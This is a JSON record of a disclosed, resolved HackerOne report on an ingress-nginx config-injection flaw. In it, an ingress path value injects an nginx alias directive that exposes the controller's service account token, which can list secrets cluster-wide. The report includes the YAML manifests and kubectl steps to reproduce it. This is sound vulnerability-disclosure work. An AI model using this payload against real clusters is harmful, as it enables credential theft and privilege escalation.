@@ -1,0 +1,179 @@
+{
+  "id": 1382919,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMzgyOTE5",
+  "url": "https://hackerone.com/reports/1382919",
+  "title": "Ingress-nginx path allows retrieval of ingress-nginx serviceaccount token",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2021-10-27T10:37:06.848Z",
+  "submitted_at": "2021-10-27T10:37:06.918Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "0ria",
+    "url": "/0ria",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 39386,
+    "url": "https://hackerone.com/kubernetes",
+    "handle": "kubernetes",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Kubernetes",
+      "twitter_handle": "kubernetesio",
+      "website": "https://kubernetes.io/",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2022-08-06T07:14:09.096Z",
+  "bug_reporter_agreed_on_going_public_at": "2022-08-06T07:14:08.987Z",
+  "team_member_agreed_on_going_public_at": "2022-07-14T18:10:53.311Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Report Submission Form\n\n## Summary:\nA user with the permissions to create an ingress resource can obtain the ingress-nginx service account token which can list secrets is all namespaces (cluster wide).\n\n## Kubernetes Version:\n1.20 (should work on (1.21 as well)\n\n## Component Version:\nnginx ingress controller v1.0.4\n\n## Steps To Reproduce:\nI deployed the latest ingress-controller (v1.0.4).\nI used a user (gaf_test) that has the permissions to get, create and update ingress resources\n(the “get” permissions is only to allow kubectl to view the newly created resource).\n\ningress-creator-role.yaml\n```yaml\napiVersion: rbac.authorization.k8s.io/v1\nkind: Role\nmetadata:\n  name: ingress-creator\n  namespace: default\nrules:\n- apiGroups: [\"networking.k8s.io\"]\n  resources: [\"ingresses\"]\n  verbs: [\"get\", \"create\", \"update\"]\n```\n\ningress-creator-role-binding.yaml\n```yaml\napiVersion: rbac.authorization.k8s.io/v1\nkind: RoleBinding\nmetadata:\n  name: gaf_test-ingress-creator-binding\n  namespace: default\nsubjects:\n- kind: User\n  name: gaf_test\n  apiGroup: rbac.authorization.k8s.io\nroleRef:\n  kind: Role\n  name: ingress-creator\n  apiGroup: rbac.authorization.k8s.io\n```\n\nThis user (gaf_user) cannot list secrets at all.\n{F1495367}\n \nUse this user (gaf_user) to create a new ingress resource in the default namespace.\n\ningress.yaml\n```yaml\napiVersion: networking.k8s.io/v1\nkind: Ingress\nmetadata:\n  name: gaf-ingress\n  annotations:\n    kubernetes.io/ingress.class: \"nginx\"\nspec:\n  rules:\n  -  http:\n      paths:\n        - path: /gaf{alias /var/run/secrets/kubernetes.io/serviceaccount/;}location ~* ^/aaa\n          pathType: Prefix\n          backend:\n            service:\n              name: some-service\n              port:\n                number: 5678\n```\n```\nkubectl apply -f ingress.yaml\n```\n{F1495369}\n \n\nAccess to nginx ingress loadbalancer to /gaf/token path.\n\nhttps://<host>/gaf/token\n\n {F1495370}\n\nDecode the token to see it belongs to the ingress-nginx\n{F1495372}\n \nThe nginx-ingress service account is bound to the nginx-ingress cluser role that can list secrets in all namespaces.\n\n## The Root Cause\nWhen a user creates an ingress resource, the new configuration is updated in the /etc/nginx/nginx.conf file in the ingress-nginx-controller pod located in the nginx-ingress namespace.\nI caused a “config file injection” using the following payload as path:\n\n**/gaf{alias /var/run/secrets/kubernetes.io/serviceaccount/;}location ~* ^/aaa**\nThe payload above creates the following configuration for nginx:\n\n/etc/nginx/nginx.conf\n\n{F1495371} \n\nThis is the relevant part from the configuration which creates a new route to /gaf path and uses an alias (http://nginx.org/en/docs/http/ngx_http_core_module.html#alias)\nthat maps to /var/run/secrets/kubernetes.io/serviceaccount/ directory on the ingress-nginx-controller pod.\n\n## Impact\n\nA user with the permissions to create an ingress resource can obtain the ingress-nginx service account token which can list secrets is all namespaces (cluster wide).",
+  "bounty_amount": "2500.0",
+  "formatted_bounty": "$2,500",
+  "weakness": {
+    "id": 75,
+    "name": "Privilege Escalation"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1495367,
+      "file_name": "get-secrets-test.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/b1y0d4yznhbu5zzkzaw86y5tbp56?response-content-disposition=attachment%3B%20filename%3D%22get-secrets-test.png%22%3B%20filename%2A%3DUTF-8%27%27get-secrets-test.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZG7L5HA3%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T151024Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJIMEYCIQDwzDLOW%2BGPNuLAtMDJB7rzjUJqhrWrXrg24FMvgwXjTAIhAPsIQv7gTxikLkRRR%2Bfmgc6%2FEBflqDw6mFU8F23MVlzwKroFCOj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igz2zCFdGB%2FM4GpoFlwqjgU6mSatW5nOxaNjLpzrMm02KJaMwjC59bgeMmtt0xY0ccLDzHWbIVeXIV%2F9v%2FC16YUKAPslTq4ZM%2FgoFTRGQeLSGqjAI9Rc4T2olc4L9Cbuw58d80jHDppF43gC3Z6Tg4KAwNjY4%2BVWMVQk3OmtEsGVuebUD5vzTtnBIILLxshyRo90qVmhqVBD8dL5NCj7fIco7FllwPXW8sgcfivHiD9G01U44H81zX%2F804ica%2Bjg%2Ft4JqlLFS4k%2BajayLLwOoAlEWff528B55SQoMBImXdoE2xgb7Wd2T303TgmS%2BlI9SwukXnordnBAl7wFwHkPl2PGrN2SH8chC%2BiNVKSFkzWzeT9xcj0MTNmj7zSPcH7AaYJ1rxS6Lj6ijXsZjfM67fxjMEOpXVc8LwQiV%2Fb8PoXNCS%2FyhkdEd6whDziXsoSv9qg20p6zlIOooSZMvcrMxJMSpI9MZbYMhT3VMNvdi8NKrYSHBgtlL0UwE6L5%2FNRPXeFGRFcHZmJBZO%2BoMmi2ufPTMBOD5nwO56my1cioF%2Bacii98Qn9%2BJAEe6xjd4XRESTqxZ9jczXCNP6mF1w%2Bf3SOKC%2FEZW0TTd5j404SgmVv1G86XUA0lW8%2BiscT0RjnUwl%2Bfgvcx%2FWOK%2BogSr641xpKgvm5JoNRiCH955yC4inks7YqAOhoVYnc46Fagrmc%2BQGqBJRbCai7uH9KvqIIhf9%2F9zIzt4jT1dRL9JfNSU6i9Ofp1eBoupvEb1EkuvFdhmptYRvvwHxMLLzjUvi5uiqhsWtqU%2F3KRBZPMvDItiTCOH5CibGCaAd5v0NzXg2JIrcACHLFJVpxvfBHjxL%2BRb%2F7o1BhFcRgcMBl7T16%2B4Wuw%2Bc86v%2FeadLVXYxsYjUcw7Y%2F9zwY6sAF4X1TISJq75cB44X2Lq1i0JZ3M94EBr1cAv6RpxkNsVW%2Br28TpbOuHsOTzLoMX2EBa5Cz9Wum%2FfTEpFCmE74E%2F4rRzRstJnEOIr1xkggMM6Yj1gZEK36z53xHkG0NN8E3EqQL9EYhhDj9mpCdfCkpse5tLMRzmHW3jIKq2FDfi%2FFTnjar8G1wa82ZVdjklmUvT293j2G46iMoYUoPRIj4IfOLk7Fuo8H2RJf3EuU7ibQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=0df765f12172d1dbe99d2c1143b996800e55500a06439b3c38a0a4ffc0f327cd",
+      "file_size": 9528,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 1495369,
+      "file_name": "apply.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/q0lwsjc8qfc2xjfxwgquox26tg4f?response-content-disposition=attachment%3B%20filename%3D%22apply.png%22%3B%20filename%2A%3DUTF-8%27%27apply.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZG7L5HA3%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T151024Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJIMEYCIQDwzDLOW%2BGPNuLAtMDJB7rzjUJqhrWrXrg24FMvgwXjTAIhAPsIQv7gTxikLkRRR%2Bfmgc6%2FEBflqDw6mFU8F23MVlzwKroFCOj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igz2zCFdGB%2FM4GpoFlwqjgU6mSatW5nOxaNjLpzrMm02KJaMwjC59bgeMmtt0xY0ccLDzHWbIVeXIV%2F9v%2FC16YUKAPslTq4ZM%2FgoFTRGQeLSGqjAI9Rc4T2olc4L9Cbuw58d80jHDppF43gC3Z6Tg4KAwNjY4%2BVWMVQk3OmtEsGVuebUD5vzTtnBIILLxshyRo90qVmhqVBD8dL5NCj7fIco7FllwPXW8sgcfivHiD9G01U44H81zX%2F804ica%2Bjg%2Ft4JqlLFS4k%2BajayLLwOoAlEWff528B55SQoMBImXdoE2xgb7Wd2T303TgmS%2BlI9SwukXnordnBAl7wFwHkPl2PGrN2SH8chC%2BiNVKSFkzWzeT9xcj0MTNmj7zSPcH7AaYJ1rxS6Lj6ijXsZjfM67fxjMEOpXVc8LwQiV%2Fb8PoXNCS%2FyhkdEd6whDziXsoSv9qg20p6zlIOooSZMvcrMxJMSpI9MZbYMhT3VMNvdi8NKrYSHBgtlL0UwE6L5%2FNRPXeFGRFcHZmJBZO%2BoMmi2ufPTMBOD5nwO56my1cioF%2Bacii98Qn9%2BJAEe6xjd4XRESTqxZ9jczXCNP6mF1w%2Bf3SOKC%2FEZW0TTd5j404SgmVv1G86XUA0lW8%2BiscT0RjnUwl%2Bfgvcx%2FWOK%2BogSr641xpKgvm5JoNRiCH955yC4inks7YqAOhoVYnc46Fagrmc%2BQGqBJRbCai7uH9KvqIIhf9%2F9zIzt4jT1dRL9JfNSU6i9Ofp1eBoupvEb1EkuvFdhmptYRvvwHxMLLzjUvi5uiqhsWtqU%2F3KRBZPMvDItiTCOH5CibGCaAd5v0NzXg2JIrcACHLFJVpxvfBHjxL%2BRb%2F7o1BhFcRgcMBl7T16%2B4Wuw%2Bc86v%2FeadLVXYxsYjUcw7Y%2F9zwY6sAF4X1TISJq75cB44X2Lq1i0JZ3M94EBr1cAv6RpxkNsVW%2Br28TpbOuHsOTzLoMX2EBa5Cz9Wum%2FfTEpFCmE74E%2F4rRzRstJnEOIr1xkggMM6Yj1gZEK36z53xHkG0NN8E3EqQL9EYhhDj9mpCdfCkpse5tLMRzmHW3jIKq2FDfi%2FFTnjar8G1wa82ZVdjklmUvT293j2G46iMoYUoPRIj4IfOLk7Fuo8H2RJf3EuU7ibQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ba0b304b5cc5fdf71551dc1218673820f635d1f37fa7900d00d15957f9125c33",
+      "file_size": 5087,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 1495370,
+      "file_name": "token-bro.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/yjda4a57eo6zkmnn0nevjmnqq0nq?response-content-disposition=attachment%3B%20filename%3D%22token-bro.png%22%3B%20filename%2A%3DUTF-8%27%27token-bro.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZG7L5HA3%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T151024Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJIMEYCIQDwzDLOW%2BGPNuLAtMDJB7rzjUJqhrWrXrg24FMvgwXjTAIhAPsIQv7gTxikLkRRR%2Bfmgc6%2FEBflqDw6mFU8F23MVlzwKroFCOj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igz2zCFdGB%2FM4GpoFlwqjgU6mSatW5nOxaNjLpzrMm02KJaMwjC59bgeMmtt0xY0ccLDzHWbIVeXIV%2F9v%2FC16YUKAPslTq4ZM%2FgoFTRGQeLSGqjAI9Rc4T2olc4L9Cbuw58d80jHDppF43gC3Z6Tg4KAwNjY4%2BVWMVQk3OmtEsGVuebUD5vzTtnBIILLxshyRo90qVmhqVBD8dL5NCj7fIco7FllwPXW8sgcfivHiD9G01U44H81zX%2F804ica%2Bjg%2Ft4JqlLFS4k%2BajayLLwOoAlEWff528B55SQoMBImXdoE2xgb7Wd2T303TgmS%2BlI9SwukXnordnBAl7wFwHkPl2PGrN2SH8chC%2BiNVKSFkzWzeT9xcj0MTNmj7zSPcH7AaYJ1rxS6Lj6ijXsZjfM67fxjMEOpXVc8LwQiV%2Fb8PoXNCS%2FyhkdEd6whDziXsoSv9qg20p6zlIOooSZMvcrMxJMSpI9MZbYMhT3VMNvdi8NKrYSHBgtlL0UwE6L5%2FNRPXeFGRFcHZmJBZO%2BoMmi2ufPTMBOD5nwO56my1cioF%2Bacii98Qn9%2BJAEe6xjd4XRESTqxZ9jczXCNP6mF1w%2Bf3SOKC%2FEZW0TTd5j404SgmVv1G86XUA0lW8%2BiscT0RjnUwl%2Bfgvcx%2FWOK%2BogSr641xpKgvm5JoNRiCH955yC4inks7YqAOhoVYnc46Fagrmc%2BQGqBJRbCai7uH9KvqIIhf9%2F9zIzt4jT1dRL9JfNSU6i9Ofp1eBoupvEb1EkuvFdhmptYRvvwHxMLLzjUvi5uiqhsWtqU%2F3KRBZPMvDItiTCOH5CibGCaAd5v0NzXg2JIrcACHLFJVpxvfBHjxL%2BRb%2F7o1BhFcRgcMBl7T16%2B4Wuw%2Bc86v%2FeadLVXYxsYjUcw7Y%2F9zwY6sAF4X1TISJq75cB44X2Lq1i0JZ3M94EBr1cAv6RpxkNsVW%2Br28TpbOuHsOTzLoMX2EBa5Cz9Wum%2FfTEpFCmE74E%2F4rRzRstJnEOIr1xkggMM6Yj1gZEK36z53xHkG0NN8E3EqQL9EYhhDj9mpCdfCkpse5tLMRzmHW3jIKq2FDfi%2FFTnjar8G1wa82ZVdjklmUvT293j2G46iMoYUoPRIj4IfOLk7Fuo8H2RJf3EuU7ibQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=21c41f9155367f006d5e64dd571ace817695dfbb8269a6e1d3623cfca452944b",
+      "file_size": 23256,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 1495371,
+      "file_name": "injected-nginx-conf.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/xvouz4m46r1gnf3tvr696li0ck9f?response-content-disposition=attachment%3B%20filename%3D%22injected-nginx-conf.png%22%3B%20filename%2A%3DUTF-8%27%27injected-nginx-conf.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZG7L5HA3%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T151024Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJIMEYCIQDwzDLOW%2BGPNuLAtMDJB7rzjUJqhrWrXrg24FMvgwXjTAIhAPsIQv7gTxikLkRRR%2Bfmgc6%2FEBflqDw6mFU8F23MVlzwKroFCOj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igz2zCFdGB%2FM4GpoFlwqjgU6mSatW5nOxaNjLpzrMm02KJaMwjC59bgeMmtt0xY0ccLDzHWbIVeXIV%2F9v%2FC16YUKAPslTq4ZM%2FgoFTRGQeLSGqjAI9Rc4T2olc4L9Cbuw58d80jHDppF43gC3Z6Tg4KAwNjY4%2BVWMVQk3OmtEsGVuebUD5vzTtnBIILLxshyRo90qVmhqVBD8dL5NCj7fIco7FllwPXW8sgcfivHiD9G01U44H81zX%2F804ica%2Bjg%2Ft4JqlLFS4k%2BajayLLwOoAlEWff528B55SQoMBImXdoE2xgb7Wd2T303TgmS%2BlI9SwukXnordnBAl7wFwHkPl2PGrN2SH8chC%2BiNVKSFkzWzeT9xcj0MTNmj7zSPcH7AaYJ1rxS6Lj6ijXsZjfM67fxjMEOpXVc8LwQiV%2Fb8PoXNCS%2FyhkdEd6whDziXsoSv9qg20p6zlIOooSZMvcrMxJMSpI9MZbYMhT3VMNvdi8NKrYSHBgtlL0UwE6L5%2FNRPXeFGRFcHZmJBZO%2BoMmi2ufPTMBOD5nwO56my1cioF%2Bacii98Qn9%2BJAEe6xjd4XRESTqxZ9jczXCNP6mF1w%2Bf3SOKC%2FEZW0TTd5j404SgmVv1G86XUA0lW8%2BiscT0RjnUwl%2Bfgvcx%2FWOK%2BogSr641xpKgvm5JoNRiCH955yC4inks7YqAOhoVYnc46Fagrmc%2BQGqBJRbCai7uH9KvqIIhf9%2F9zIzt4jT1dRL9JfNSU6i9Ofp1eBoupvEb1EkuvFdhmptYRvvwHxMLLzjUvi5uiqhsWtqU%2F3KRBZPMvDItiTCOH5CibGCaAd5v0NzXg2JIrcACHLFJVpxvfBHjxL%2BRb%2F7o1BhFcRgcMBl7T16%2B4Wuw%2Bc86v%2FeadLVXYxsYjUcw7Y%2F9zwY6sAF4X1TISJq75cB44X2Lq1i0JZ3M94EBr1cAv6RpxkNsVW%2Br28TpbOuHsOTzLoMX2EBa5Cz9Wum%2FfTEpFCmE74E%2F4rRzRstJnEOIr1xkggMM6Yj1gZEK36z53xHkG0NN8E3EqQL9EYhhDj9mpCdfCkpse5tLMRzmHW3jIKq2FDfi%2FFTnjar8G1wa82ZVdjklmUvT293j2G46iMoYUoPRIj4IfOLk7Fuo8H2RJf3EuU7ibQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=2ce246127bb98edc5df87662a6ccd48c0f4d033af35446da412dff5e0f34a820",
+      "file_size": 133792,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 1495372,
+      "file_name": "ingress-nginx-serviceaccount-token.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/75kj85nxsrlid96s4f6ko68hb52e?response-content-disposition=attachment%3B%20filename%3D%22ingress-nginx-serviceaccount-token.png%22%3B%20filename%2A%3DUTF-8%27%27ingress-nginx-serviceaccount-token.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZG7L5HA3%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T151024Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJIMEYCIQDwzDLOW%2BGPNuLAtMDJB7rzjUJqhrWrXrg24FMvgwXjTAIhAPsIQv7gTxikLkRRR%2Bfmgc6%2FEBflqDw6mFU8F23MVlzwKroFCOj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igz2zCFdGB%2FM4GpoFlwqjgU6mSatW5nOxaNjLpzrMm02KJaMwjC59bgeMmtt0xY0ccLDzHWbIVeXIV%2F9v%2FC16YUKAPslTq4ZM%2FgoFTRGQeLSGqjAI9Rc4T2olc4L9Cbuw58d80jHDppF43gC3Z6Tg4KAwNjY4%2BVWMVQk3OmtEsGVuebUD5vzTtnBIILLxshyRo90qVmhqVBD8dL5NCj7fIco7FllwPXW8sgcfivHiD9G01U44H81zX%2F804ica%2Bjg%2Ft4JqlLFS4k%2BajayLLwOoAlEWff528B55SQoMBImXdoE2xgb7Wd2T303TgmS%2BlI9SwukXnordnBAl7wFwHkPl2PGrN2SH8chC%2BiNVKSFkzWzeT9xcj0MTNmj7zSPcH7AaYJ1rxS6Lj6ijXsZjfM67fxjMEOpXVc8LwQiV%2Fb8PoXNCS%2FyhkdEd6whDziXsoSv9qg20p6zlIOooSZMvcrMxJMSpI9MZbYMhT3VMNvdi8NKrYSHBgtlL0UwE6L5%2FNRPXeFGRFcHZmJBZO%2BoMmi2ufPTMBOD5nwO56my1cioF%2Bacii98Qn9%2BJAEe6xjd4XRESTqxZ9jczXCNP6mF1w%2Bf3SOKC%2FEZW0TTd5j404SgmVv1G86XUA0lW8%2BiscT0RjnUwl%2Bfgvcx%2FWOK%2BogSr641xpKgvm5JoNRiCH955yC4inks7YqAOhoVYnc46Fagrmc%2BQGqBJRbCai7uH9KvqIIhf9%2F9zIzt4jT1dRL9JfNSU6i9Ofp1eBoupvEb1EkuvFdhmptYRvvwHxMLLzjUvi5uiqhsWtqU%2F3KRBZPMvDItiTCOH5CibGCaAd5v0NzXg2JIrcACHLFJVpxvfBHjxL%2BRb%2F7o1BhFcRgcMBl7T16%2B4Wuw%2Bc86v%2FeadLVXYxsYjUcw7Y%2F9zwY6sAF4X1TISJq75cB44X2Lq1i0JZ3M94EBr1cAv6RpxkNsVW%2Br28TpbOuHsOTzLoMX2EBa5Cz9Wum%2FfTEpFCmE74E%2F4rRzRstJnEOIr1xkggMM6Yj1gZEK36z53xHkG0NN8E3EqQL9EYhhDj9mpCdfCkpse5tLMRzmHW3jIKq2FDfi%2FFTnjar8G1wa82ZVdjklmUvT293j2G46iMoYUoPRIj4IfOLk7Fuo8H2RJf3EuU7ibQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=cdf26e3ff7b2d0879f0523bc2c35ff15534d30f1afc1bd943b90b9bec92205f9",
+      "file_size": 54316,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2022-08-13T18:10:53.412Z",
+  "allow_singular_disclosure_after": -117925171.5682745,
+  "singular_disclosure_allowed": true,
+  "vote_count": 17,
+  "voters": [
+    "n1m0",
+    "a_d_a_m",
+    "dexter0us",
+    "zy9ard3",
+    "yassinek3ch",
+    "skyping0x",
+    "13370verride",
+    "f1ras",
+    "shivammusic",
+    "bugdetector",
+    "and 7 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 7.6,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "low",
+      "availability": "low"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 32524,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/kubernetes/ingress-nginx",
+    "max_severity": "none"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
